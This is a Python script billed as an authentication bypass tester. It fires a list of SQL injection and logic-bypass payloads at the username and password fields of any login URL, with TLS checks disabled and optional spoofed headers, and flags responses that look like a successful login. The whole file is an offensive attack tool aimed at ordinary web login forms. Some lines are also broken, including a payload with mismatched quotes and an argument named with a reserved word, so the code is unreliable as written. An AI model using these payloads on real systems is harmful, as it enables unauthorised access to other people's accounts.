#!/usr/bin/env python3
import requests
import argparse
import urllib3
from termcolor import colored
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Payloads for SQLi and logic bypass
payloads = [
    "' OR 1=1--",
    "admin' --",
    "' OR '1'='1",
    "' OR 'a'='a",
    "' OR 1=1 LIMIT 1--",
    "' OR '1'='1' --",
    "' OR ''='",
    "admin' OR '1'='1",
    "admin' or 1=1--",
    "' or sleep(5)--",
    "admin@%' --",
    "*' or 'a'='a",
    "admin\"--",
    "\" OR 1=1--",
    "\" OR \"1\"=\"1",
    "admin@%",
    "admin@localhost",
    "' OR TRUE--",
    "'||'='",
    """ OR "" = """,
    "' or 0=0 --",
    "' or '' = '",
    "admin'#",
    "' OR 'x'='x" --",
    "admin\0",
    "' or 1=1#",
    "' or 1=1/*",
    "') or ('1'='1",
    "admin' or '1'='1' /*"
]

def test_bypass(url, user_field, pass_field, success_keywords, proxy=None, headers={}):
    for p in payloads:
        data = {
            user_field: p,
            pass_field: p
        }

        try:
            proxies = {"http": proxy, "https": proxy} if proxy else {}
            r = requests.post(url, data=data, headers=headers, verify=False, proxies=proxies, allow_redirects=True)
            body = r.text.lower()
            status = r.status_code
            cookies = r.cookies.get_dict()

            success = False
            for keyword in success_keywords:
                if keyword.lower() in body:
                    print(colored(f"[🚪] Bypass success with payload: {p}", "green"))
                    success = True
                    break
            if not success:
                if "set-cookie" in r.headers or cookies:
                    print(colored(f"[🍪] Set-Cookie returned (maybe logged in): {p}", "yellow"))
                elif status in [200, 302] and not any(k in r.url.lower() for k in ["login", "signin"]):
                    print(colored(f"[➡️] Suspicious redirect or 200 OK: {p}", "cyan"))
                else:
                    print(f"[✖] Failed: {p}")
        except Exception as e:
            print(colored(f"[!] Error: {e}", "red"))

def main():
    parser = argparse.ArgumentParser(description="🔓 Authentication Bypass Tester - test login forms for SQLi, logic flaws, wildcards")
    parser.add_argument("url", help="Login form URL")
    parser.add_argument("--user", default="username", help="Username field name")
    parser.add_argument("--pass", default="password", help="Password field name")
    parser.add_argument("--keyword", nargs="+", default=["dashboard", "logout", "welcome", "admin", "panel"], help="Success indicator keywords")
    parser.add_argument("--proxy", help="Proxy (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--cookie", help="Add Cookie header")
    parser.add_argument("--xff", help="Add X-Forwarded-For header")
    args = parser.parse_args()

    headers = {
        "User-Agent": "Mozilla/5.0 (AuthBypassScanner)"
    }

    if args.cookie:
        headers["Cookie"] = args.cookie
    if args.xff:
        headers["X-Forwarded-For"] = args.xff

    test_bypass(args.url, args.user, args.pass, args.keyword, args.proxy, headers)

if __name__ == "__main__":
    main()
